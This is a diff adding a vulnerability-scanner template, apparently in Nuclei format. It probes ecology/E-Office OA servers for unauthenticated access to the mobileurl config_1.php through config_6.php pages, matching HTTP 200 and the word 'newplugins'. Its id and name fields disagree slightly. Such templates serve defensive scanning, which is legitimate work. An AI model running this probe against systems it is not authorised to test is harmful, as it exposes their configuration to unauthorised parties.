@@ -1,0 +1,46 @@
+id: DVB-2023-528-2
+info:
+  name: DVB-2023-5285-2
+  severity: high
+  author: ecology-EOffice-mobileurl_config-unauth-access
+  tags: ecology,oa,
+
+http:
+
+  - raw:
+      - |
+        GET /building/backmgr/urlpage/mobileurl/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+    payloads:
+    
+        path:
+
+          - config_1.php
+
+          - config_2.php
+
+          - config_3.php
+
+          - config_4.php
+
+          - config_5.php
+
+          - config_6.php
+
+#    stop-at-first-match: true
+
+    matchers-condition: and
+
+    matchers:
+
+        - type: word
+
+          words:
+
+              - "newplugins"
+
+        - type: status
+
+          status:
+
+              - 200
